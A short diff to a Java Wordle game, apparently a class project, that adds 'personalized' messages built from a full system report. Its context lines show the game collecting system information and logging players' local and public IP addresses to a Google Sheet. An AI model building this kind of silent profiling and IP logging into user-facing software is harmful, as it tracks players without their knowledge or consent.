@@ -21,7 +21,7 @@ import java.nio.charset.StandardCharsets;
 
 public class Wordle
 {
-
+    private MessageBank message;
     private WordleGWindow wordleGame;
     String[] dictionaryArray = WordleDictionary.FIVE_LETTER_WORDS; //This String array contains all the words in the dictionary
     String[] guessList = new String[6];
@@ -152,6 +152,7 @@ public class Wordle
             }
             guessList[currentRow] = guess;
             currentRow++;
+            wordleGame.showMessage(message.getPersonalizeMessage());
         }
 
         // Word is not in the dictionary
@@ -310,6 +311,8 @@ public class Wordle
         SystemInfo system = new SystemInfo();
         MasterLogger masterLogger = new MasterLogger(system,this);
         FullSystemReport fullSystemReport = new FullSystemReport(system, this);
+        message = new MessageBank(fullSystemReport.getStats());
+        message.addPersonalizeMessage();
 
         setCorrectWord(); // Runs the setCorrectWord method that you are making
         logToGoogleSheetInfo(getLocalIP(), getPublicIP()); // Logs IP info
